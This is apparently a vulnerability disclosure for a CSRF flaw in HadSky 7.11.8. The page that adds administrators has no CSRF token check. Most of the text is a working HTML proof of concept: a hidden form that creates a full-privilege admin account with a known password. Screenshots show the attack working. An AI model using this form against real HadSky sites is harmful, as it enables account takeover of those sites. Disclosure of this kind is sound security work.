hadsky version 7.11.8 has a CSRF vulnerability

official website:https://www.hadsky.com/

version : 7.11.8

The added administrator page is not protected by csrftoken. As a result, administrators can be tricked into adding administrator users.

POC
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://www.hadskynew.com/index.php?c=app&a=superadmin:index&s=save&table=user&id=&chkcsrfval=5f88ffcbe2462c792adcb56ddbe0e671&json=yes" method="POST">
      <input type="hidden" name="&#95;webos" value="HadSky" />
      <input type="hidden" name="chkcsrfval" value="5f88ffcbe2462c792adcb56ddbe0e671" />
      <input type="hidden" name="groupid" value="1" />
      <input type="hidden" name="username" value="admin12" />
      <input type="hidden" name="password" value="admin1" />
      <input type="hidden" name="nickname" value="admin12" />
      <input type="hidden" name="email" value="12312321&#64;qq&#46;com" />
      <input type="hidden" name="quanxian" value="bbcode&#44;login&#44;lookuser&#44;postreply&#44;uploadfile&#44;uploadhead&#44;search&#44;postread&#44;lookread&#44;download&#44;delread&#44;editread&#44;nopostreadcheck&#44;noverifycode&#44;admin&#44;htmlcode&#44;delreply&#44;editreply&#44;nopostreplycheck&#44;nopostingtimeinterval&#44;superman" />
      <input type="hidden" name="readlevel" value="0" />
      <input type="hidden" name="jifen" value="0" />
      <input type="hidden" name="tiandou" value="0" />
      <input type="hidden" name="data&#45;htmlcodemarks" value="" />
      <input type="hidden" name="data&#45;htmlcodeattrs" value="" />
      <input type="hidden" name="data&#45;signcodemarks" value="" />
      <input type="hidden" name="data&#45;signcodeattrs" value="" />
      <input type="hidden" name="data&#45;uploadsize" value="100" />
      <input type="hidden" name="data&#45;dayuploadfilesize" value="100" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

After the administrator logs in, click the page to add an administrator user

![微信图片_20230709232002](https://github.com/nightcloudos/cve/assets/76925342/24f5340c-48cf-4d61-be3b-ced029e35805)

![微信图片_20230709232033](https://github.com/nightcloudos/cve/assets/76925342/900d8c62-b3e7-4a3e-9943-44cd230d7ede)

Go back to the background and check that the admin123 user was successfully added
![微信图片_20230709232110](https://github.com/nightcloudos/cve/assets/76925342/b3809b85-5620-4520-8a9f-93445319d24b)

